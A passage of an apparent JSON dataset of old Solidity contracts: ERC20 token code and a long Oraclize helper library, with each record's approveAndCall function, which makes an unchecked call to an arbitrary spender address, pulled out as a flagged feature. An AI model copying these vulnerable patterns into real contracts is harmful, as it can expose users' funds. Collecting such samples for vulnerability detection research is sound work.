\"Blammascoin\";\n decimals = 8;\n symbol = \"BMS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1613"
  },
  "filename": "37533.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"Blammascoin\";\n decimals = 8;\n symbol = \"BMS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1614"
  },
  "filename": "37573.sol",
  "content": "pragma solidity ^0.4.13;\npragma solidity ^0.4.0;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns (bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60 * 60 * 24;\n uint constant week = 60 * 60 * 24 * 7;\n uint constant month = 60 * 60 * 24 * 30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if ((address(OAR) == 0) || (getCodeSize(address(OAR)) == 0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns (bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed) > 0) {\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1) > 0) {\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e) > 0) {\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48) > 0) {\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475) > 0) {\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF) > 0) {\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA) > 0) {\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice * 200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns (uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i = 2; i < 2 + 2 * 20; i += 2) {\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i + 1]);\n if ((b1 >= 97) && (b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65) && (b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48) && (b1 <= 57)) b1 -= 48;\n if ((b2 >= 97) && (b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65) && (b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48) && (b2 <= 57)) b2 -= 48;\n iaddr += (b1 * 16 + b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return - 1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return - 1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if (h.length < 1 || n.length < 1 || (n.length > h.length))\n return - 1;\n else if (h.length > (2 ** 128 - 1))\n return - 1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while (subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if (subindex == n.length)\n return int(i);\n }\n }\n return - 1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i = 0; i < bresult.length; i++) {\n if ((bresult[i] >= 48) && (bresult[i] <= 57)) {\n if (decimals) {\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n }\n else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10 ** _b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0) {\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0) {\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1) / 23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1) / 23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n 